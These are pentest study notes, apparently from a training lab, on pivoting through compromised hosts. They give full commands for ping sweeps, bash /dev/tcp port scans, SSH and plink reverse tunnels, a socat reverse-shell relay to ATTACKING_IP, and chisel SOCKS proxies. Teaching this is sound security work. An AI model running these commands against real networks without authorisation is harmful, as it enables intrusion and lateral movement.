<title>pivoting</title>
</head><body><span style="font-size: 12pt"><span style="font-family: Calibri">The methods we use to pivot tend to vary between the different target operating systems. Frameworks like Metasploit can make the process easier, however, for the time being, we'll be looking at more manual techniques for pivoting.<br/>
<br/>
There are two main methods encompassed in this area of pentesting:<br/>
- Tunnelling/Proxying: Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall<br/>
- Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host<br/>
<br/>
A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.<br/>
Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device. <br/>
<br/>
As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux webserver is absolutely ideal.<br/>
<br/>
We will cover the following topics:<br/>
- Enumerating a network using native and statically compiled tools<br/>
- Proxychains / FoxyProxy<br/>
- SSH port forwarding and tunnelling (primarily Unix)<br/>
- plink.exe (Windows)<br/>
- socat (Windows and Unix)<br/>
- chisel (Windows and Unix)<br/>
- sshuttle (currently Unix only)<br/>
<br/>
Information is power -- the more we know about our target, the more options we have available to us. As such, our first step when attempting to pivot through a network is to get an idea of what's around us.<br/>
<br/>
There are five possible ways to enumerate a network through a compromised host:<br/>
- Using material found on the machine. The hosts file or ARP cache, for example<br/>
- Using pre-installed tools<br/>
- Using statically compiled tools<br/>
- Using scripting techniques<br/>
- Using local tools through a proxy<br/>
<br/>
These are written in the order of preference. Using local tools through a proxy is incredibly slow, so should only be used as a last resort. Ideally we want to take advantage of pre-installed tools on the system (Linux systems sometimes have Nmap installed by default, for example). This is an example of Living off the Land (LotL) -- a good way to minimise risk. Failing that, it's very easy to transfer a static binary, or put together a simple ping-sweep tool in Bash.<br/>
<br/>
Before anything else though, it's sensible to check to see if there are any pieces of useful information stored on the target. "arp -a" or "arp -e" can be used to Windows or Linux to check the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently. Equally, static mappings may be found in "/etc/hosts" on Linux, or "C:\Windows\System32\drivers\etc\hosts" on Windows. &nbsp;"/etc/resolv.conf" on Linux may also identify any local DNS servers, which may be misconfigured to allow something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into). On Windows the easiest way to check the DNS servers for an interface is with "ipconfig /all". Linux has an equivalent command as an alternative to reading the "resolv.conf" file: "nmcli dev show".<br/>
<br/>
If there are no useful tools already installed on the system, and the rudimentary scripts are not working, then it's possible to get static copies of many tools. These are versions of the tool that have been compiled in such a way as to not require any dependencies from the machine. In other words, they could theoretically work on any target, assuming the correct OS and architecture. Be aware that many repositories of static tools are very outdated. Tools from these repositories will likely still do the job; however, you may find that they require different syntax, or don't work in quite the way that you've come to expect.<br/>
<br/>
Note: The difference between a "static" binary and a "dynamic" binary is in the compilation. Most programs use a variety of external libraries (".so" files on Linux, or ".dll" files on Windows) -- these are referred to as "dynamic" programs. Static programs are compiled with these libraries built into the finished executable file. When we're trying to use the binary on a target system we will nearly always need a statically compiled copy of the program, as the system may not have the dependencies installed meaning that a dynamic binary would be unable to run.<br/>
<br/>
Finally, the dreaded scanning through a proxy. This should be an absolute last resort, as scanning through something like proxychains is very slow, and often limited (you cannot scan UDP ports through a TCP proxy, for example). The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy specifically against the found ports.<br/>
<br/>
Before putting this all into practice let's talk about living off the land shell techniques. Ideally a tool like Nmap will already be installed on the target; however, this is not always the case (indeed, you'll find that Nmap is not installed on the currently compromised server of the Wreath network). If this happens, it's worth looking into whether you can use an installed shell to perform a sweep of the network. For example, the following Bash one-liner would perform a full ping sweep of the 192.168.1.x network:<br/>
- "for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &amp;); done" (this could be easily modified to search other network ranges)<br/>
<br/>
The equivalent of this command in Powershell is unbearably slow, so it's better to find an alternative option where possible. It's relatively straight forward to write a simple network scanner in a language like C# (or a statically compiled scanner written in C/C++/Rust/etc), which can be compiled and used on the target. This, however, is outwith the scope of the Wreath network (although very simple beta examples can be found here for C#, or here for C++).<br/>
It's worth noting as well that you may encounter hosts which have firewalls blocking ICMP pings (Windows machineses frequently do this, for example). This is likely to be less of a problem when pivoting, however, as these firewalls (by default) often only apply to external traffic, meaning that anything sent through a compromised host on the network should be safe. It's worth keeping in mind, however.<br/>
If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.<br/>
<br/>
Port scanning in bash can be done (ideally) entirely natively:<br/>
- "for i in {1..65535}; do (echo &gt; /dev/tcp/192.168.1.1/$i) &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo $i is open; done"<br/>
Bear in mind that this will take a very long time, however!<br/>
<br/>
<br/>
When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network. Proxychains and FoxyProxy can be used to direct our traffic through this port and into our target network.<br/>
<br/>
Proxychains:<br/>
It's a very useful tool -- although not without its drawbacks. Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only when required. Proxychains is a command line tool which is activated by prepending the command proxychains to other commands. For example:<br/>
"proxychains nc 172.16.0.10 23"<br/>
<br/>
A proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at /etc/proxychains.conf. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:<br/>
- The current directory (i.e. "./proxychains.conf")<br/>
- "~/.proxychains/proxychains.conf"<br/>
- "/etc/proxychains.conf"<br/>
<br/>
This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: "cp /etc/proxychains.conf .", then make any changes to the config file in a copy stored in your current directory. If you're likely to move directories a lot then you could instead place it in a ".proxychains" directory under your home directory, achieving the same results. If you happen to lose or destroy the original master copy of the proxychains config, a replacement can be downloaded from (https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf).<br/>
Speaking of the proxychains.conf file, there is only one section of particular use to us at this moment of time: right at the bottom of the file are the servers used by the proxy. You can set more than one server here to chain proxies together. It is here that we can choose which port(s) to forward the connection through. By default there is one proxy set to localhost port 9050 -- this is the default port for a Tor entrypoint, should you choose to run one on your attacking machine. That said, it is not hugely useful to us. This should be changed to whichever (arbitrary) port is being used for the proxies. There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the "Proxy DNS settings". If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the "proxy_dns" line using a hashtag (#) at the start of the line before performing a scan through the proxy!<br/>
<br/>
Other things to note when scanning through proxychains:<br/>
- You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the &nbsp;-Pn &nbsp;switch to prevent Nmap from trying it.<br/>
- It will be extremely slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library).<br/>
<br/>
FoxyProxy:<br/>
Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available, namely: FoxyProxy! People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be used alongside the tools we'll be looking at in order to access web apps on an internal network. FoxyProxy is a browser extension which is available for Firefox and Chrome. There are two versions of FoxyProxy available: Basic and Standard.<br/>
Fill in the IP and Port on the right hand side of the page that appears, then give it a name. Set the proxy type to the kind of proxy you will be using. SOCKS4 is usually a good bet. Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). Be aware that if the target network doesn't have internet access then you will not be able to access the outside internet when the proxy is activated. Even in a real engagement, routing your general internet searches through a client's network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than interaction with the target network is advised.<br/>
<br/>
<br/>
SSH Tunnelling / Port Forwarding<br/>
The first tool we'll be looking at is none other than the bog-standard SSH client with an OpenSSH server. Using these simple tools, it's possible to create both forward and reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.<br/>
<br/>
Forward Connections:<br/>
Creating a forward (or "local") SSH tunnel can be done from our attacking machine when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.<br/>
There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy:<br/>
<br/>
- Port forwarding is accomplished with the "-L" switch, which creates a link to a Local port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:<br/>
"ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN"<br/>
We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 on our own attacking machine. For example, by entering "localhost:8000" into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own machine. Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use "sudo" to create the connection. The "-fN" combined switch does two things: "-f" backgrounds the shell immediately so that we have our own terminal back. "-N" tells SSH that it doesn't need to execute any commands -- only set up the connection.<br/>
- Proxies are made using the "-D" switch, for example: "-D 1337". This will open up port 1337 on your attacking machine as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:<br/>
"ssh -D 1337 user@172.16.0.5 -fN"<br/>
This again uses the "-fN" switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.<br/>
<br/>
Reverse Connections:<br/>
Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine from the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:<br/>
- First, generate a new set of SSH keys and store them somewhere safe (ssh-keygen). This will create two new files: a private key, and a public key.<br/>
- Copy the contents of the public key (the file ending with ".pub"), then edit the "~/.ssh/authorized_keys" file on your own attacking machine. You may need to create the "~/.ssh" directory and "authorized_keys" file first.<br/>
- On a new line, type the following line, then paste in the public key:<br/>
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty<br/>
This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.<br/>
<br/>
Next. check if the SSH server on your attacking machine is running:<br/>
- "sudo systemctl status ssh"<br/>
<br/>
The only thing left is to do the unthinkable: transfer the private key to the target machine. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.<br/>
<br/>
With the key transferred, we can then connect back with a reverse port forward using the following command:<br/>
- "ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN"<br/>
<br/>
To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking machine (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:<br/>
- "ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN"<br/>
<br/>
This would open up a port forward to our Kali machine, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!<br/>
<br/>
In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the "-D" switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:<br/>
- "ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN"<br/>
<br/>
This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.<br/>
Note: Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from.<br/>
<br/>
To close any of these connections, type "ps aux | grep ssh" into the terminal of the machine that created the connection, find the process ID (PID) of the connection and type "kill PID" to close the connection.<br/>
<br/>
<br/>
Plink<br/>
Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool. Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:<br/>
"cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N"<br/>
<br/>
The "cmd.exe /c echo y" at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise), in order to get around the warning message that the target has not connected to this host before. To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:<br/>
"cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N"<br/>
<br/>
Note that any keys generated by "ssh-keygen" will not work properly here. You will need to convert them using the "puttygen" tool, which can be installed on Kali using "sudo apt install putty-tools". After downloading the tool, conversion can be done with:<br/>
"puttygen KEYFILE -o OUTPUT_KEY.ppk"<br/>
The resulting .ppk file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).<br/>
<br/>
Note: Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the .exe. Whilst there is a copy pre-installed on Kali at /usr/share/windows-resources/binaries/plink.exe, downloading a new copy from here before a new engagement is sensible.<br/>
<br/>
<br/>
Socat<br/>
Socat is not just great for fully stable Linux shells, it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both Linux (https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat) and Windows (https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download). Bear in mind that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Before we begin, it's worth noting that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption options to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however, it's well worth experimenting with this in your own time.<br/>
<br/>
Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking machine. It's best to think of socat as a way to join two things together. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into.<br/>
<br/>
Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or create a port forward. Specifically, for example; we're creating a port forward from a port on the compromised server to a listening port on our own machine. We could do this the other way though, by either forwarding a connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the attacking machine with the service on the internal server. This latter application is especially useful as it does not require opening a port on the compromised server. Before using socat, it will usually be necessary to download a binary for it, then upload it to the compromised machine. Let's have a look at each of the above scenarios in turn:<br/>
<br/>
Reverse Shell Relay:<br/>
In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the scenario above). First let's start a standard netcat listener on our attacking machine ("sudo nc -lvnp 443"). Next, on the compromised machine, use the following command to start the relay:<br/>
- "socat tcp-listen:8000 tcp:ATTACKING_IP:443 &amp;"<br/>
Note: the order of the two addresses matters here. Make sure to open the listening port first, then connect back to the attacking machine.<br/>
<br/>
A brief explanation of the above command:<br/>
<br/>
- "tcp-l:8000" is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.<br/>
- "tcp:ATTACKING_IP:443" connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.<br/>
- "&amp;" backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.<br/>
<br/>
The relay connects back to a listener started using an alias to a standard netcat listener: "sudo nc -lvnp 443".<br/>
<br/>
In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.<br/>
<br/>
Port Forwarding -- Easy:<br/>
The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:<br/>
- "socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &amp;"<br/>
<br/>
This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. The "fork" option is used to put every connection into a new process, and the "reuseaddr" option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use "&amp;" to background the shell, allowing us to keep using the same terminal session on the compromised server for other things. We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.<br/>
<br/>
Port Forwarding -- Quiet:<br/>
The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.<br/>
<br/>
First of all, on our own attacking machine, we issue the following command:<br/>
- "socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &amp;"<br/>
<br/>
This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the "fork" and "reuseaddr" options set, to allow us to create more than one connection using this port forward.<br/>
<br/>
Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:<br/>
- "socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &amp;"<br/>
<br/>
This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:<br/>
- "socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &amp;"<br/>
<br/>
This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to "localhost:8000" in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!<br/>
<br/>
This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:<br/>
- The request goes to "127.0.0.1:8000"<br/>
- Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001<br/>
- Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.<br/>
The process is then reversed when the target sends the response:<br/>
- The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.<br/>
- Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.<br/>
<br/>
We have now achieved the same thing as previously, but without opening any ports on the server!<br/>
Finally, we've learnt how to create backgrounded socat port forwards and relays, but it's important to also know how to close these. The solution is simple: run the "jobs" command in your terminal, then kill any socat processes using "kill %NUMBER".<br/>
<br/>
<br/>
Chisel<br/>
Chisel (https://github.com/jpillora/chisel) is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It's written in Golang and can be easily compiled for any system. In many ways it provides the same functionality as the standard SSH proxying / port forwarding we covered earlier; however, the fact it doesn't require SSH access on the compromised target is a big bonus.<br/>
The chisel binary has two modes: client and server. You can access the help menus for either with the command: <br/>
- "chisel client/server --help"<br/>
<br/>
We will be looking at two uses for chisel (a SOCKS proxy, and port forwarding); however, chisel is a very versatile tool which can be used in many ways not described here. You are encouraged to read through the help pages for the tool for this reason.<br/>
<br/>
Reverse SOCKS Proxy:<br/>
Let's start by looking at setting up a reverse SOCKS proxy with chisel. This connects back from a compromised server to a listener waiting on our attacking machine. On our own attacking machine we would use a command that looks something like this:<br/>
- "chisel server -p LISTEN_PORT --reverse &amp;"<br/>
<br/>
On the compromised host, we would use the following command:<br/>
- "chisel client ATTACKING_IP:LISTEN_PORT R:socks &amp;"<br/>
<br/>
Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on 127.0.0.1:1080. As such, we will be using port 1080 when sending data through the proxy. Note the use of R:socks in this command. "R" is prefixed to remotes (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server).<br/>
<br/>
Forward SOCKS Proxy:<br/>
Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections). <br/>
<br/>
In many ways the syntax for this is simply reversed from a reverse proxy.<br/>
<br/>
First, on the compromised host we would use:<br/>
- "chisel server -p LISTEN_PORT --socks5"<br/>
<br/>
On our own attacking machine we would then use:<br/>
- "chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks"<br/>
<br/>
In this command, "PROXY_PORT" is the port that will be opened for the proxy.<br/>
<br/>
For example, "chisel client 172.16.0.10:8080 1337:socks" would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.<br/>
<br/>
Proxychains Reminder:<br/>
When sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from socks4 to socks5:<br/>
<br/>
[ProxyList]<br/>
# add proxy here ...<br/>
# meanwhile<br/>
# defaults set to "tor"<br/>
socks5 &nbsp;127.0.0.1 1080<br/>
<br/>
Note: The above configuration is for a reverse SOCKS proxy -- as mentioned previously, the proxy opens on port 1080 rather than the specified listening port (1337). If you use proxychains with a forward proxy then the port should be set to whichever port you opened (1337 in the above example).<br/>
<br/>
Now that we've seen how to use chisel to create a SOCKS proxy, let's take a look at using it to create a port forward with chisel.<br/>
<br/>
Remote Port Forward:<br/>
A remote port forward is when we connect back from a compromised target to create the forward.<br/>
For a remote port forward, on our attacking machine we use the exact same command as before:<br/>
- "./chisel server -p LISTEN_PORT --reverse &amp;"<br/>
<br/>
Once again this sets up a chisel listener for the compromised host to connect back to.<br/>
The command to connect back is slightly different this time, however:<br/>
- "./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &amp;"<br/>
<br/>
You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons. Note the distinction between the LISTEN_PORT and the LOCAL_PORT. Here the LISTEN_PORT is the port that we started the chisel server on, and the LOCAL_PORT is the port we wish to open on our own attacking machine to link with the desired target port.<br/>
To use an old example, let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:<br/>
- "./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &amp;"<br/>
<br/>
Connecting back to our attacking machine, functioning as a chisel server started with:<br/>
- "./chisel server -p 1337 --reverse &amp;"<br/>
<br/>
This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.<br/>
<br/>
Local Port Forward:<br/>
As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.<br/>
On the compromised target we set up a chisel server:<br/>
- "./chisel server -p LISTEN_PORT"<br/>
<br/>
We now connect to this from our attacking machine like so:<br/>
- "./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT"<br/>
<br/>
For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:<br/>
- "./chisel client 172.16.0.5:8000 2222:172.16.0.10:22"<br/>
<br/>
As with the backgrounded socat processes, when we want to destroy our chisel connections we can use jobs to see a list of backgrounded jobs, then kill %NUMBER to destroy each of the chisel processes.<br/>
<br/>
<br/>
sshuttle (https://github.com/sshuttle/sshuttle)<br/>
This tool is quite different from the others we have covered so far. It doesn't perform a port forward, and the proxy it creates is nothing like the ones we have already seen. Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy without the use of proxychains (or an equivalent). We can just directly connect to devices in the target network as we would normally connect to networked devices. As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. We use sshuttle entirely on our attacking machine, in much the same way we would SSH into a remote server.<br/>
Whilst this sounds like an incredible upgrade, it is not without its drawbacks. For a start, sshuttle only works on Linux targets. It also requires access to the compromised server via SSH, and Python also needs to be installed on the server. That said, with SSH access, it could theoretically be possible to upload a static copy of Python and work with that. These restrictions do somewhat limit the uses for sshuttle; however, when it is an option, it tends to be a superb bet!<br/>
<br/>
The base command for connecting to a server with sshuttle is as follows:<br/>
- "sshuttle -r username@address subnet "<br/>
<br/>
For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:<br/>
- "sshuttle -r user@172.16.0.5 172.16.0.0/24"<br/>
<br/>
We would then be asked for the user's password, and the proxy would be established. The tool will then just sit passively in the background and forward relevant traffic into the target network.<br/>
<br/>
Rather than specifying subnets, we could also use the "-N" option which attempts to determine them automatically based on the compromised server's own routing table:<br/>
- "sshuttle -r username@address -N"<br/>
<br/>
Bear in mind that this may not always be successful though! If this has worked, you should see the following line:<br/>
"c : Connected to server."<br/>
<br/>
As with the previous tools, these commands could also be backgrounded by appending the ampersand (&amp;) symbol to the end.<br/>
<br/>
Well, that's great, but what happens if we don't have the user's password, or the server only accepts key-based authentication? Unfortunately, sshuttle doesn't currently seem to have a shorthand for specifying a private key to authenticate to the server with. That said, we can easily bypass this limitation using the "--ssh-cmd" switch. This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply "ssh" with no arguments. With the "--ssh-cmd" switch, we can pick a different command to execute for authentication: say, "ssh -i keyfile", for example!<br/>
<br/>
So, when using key-based authentication, the final command looks something like this:<br/>
- "sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET"<br/>
<br/>
To use our example from before, the command would be:<br/>
"sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24"<br/>
<br/>
Please Note: When using sshuttle, you may encounter an error that looks like this:<br/>
"client: Connected.<br/>
client_loop: send disconnect: Broken pipe<br/>
client: fatal: server died with error code 255"<br/>
<br/>
This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die. To get around this, we tell sshuttle to exclude the compromised server from the subnet range using the -x switch.<br/>
<br/>
To use our earlier example:<br/>
- "sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5"<br/>
<br/>
This will allow sshuttle to create a connection without disrupting itself.<br/>
<br/>
The big take away from this section is: there are many different ways to pivot through a network, (for example, on a fully rooted target, it's possible to use the installed firewall -- e.g. iptables or Windows Firewall -- to create entry points into an otherwise inaccessible network. Equally, it's possible to set up a route manually in the routing table of your attacking machine to, routing your traffic into the target network without requiring a proxy-tool like Proxychains or Foxyproxy). <br/>
- Proxychains and FoxyProxy are used to access a proxy created with one of the other tools<br/>
- SSH can be used to create both port forwards, and proxies<br/>
- plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows<br/>
- Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways<br/>
- Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box<br/>
- sshuttle is a nicer way to create a proxy when we have SSH access on a target</span></span></body></html>
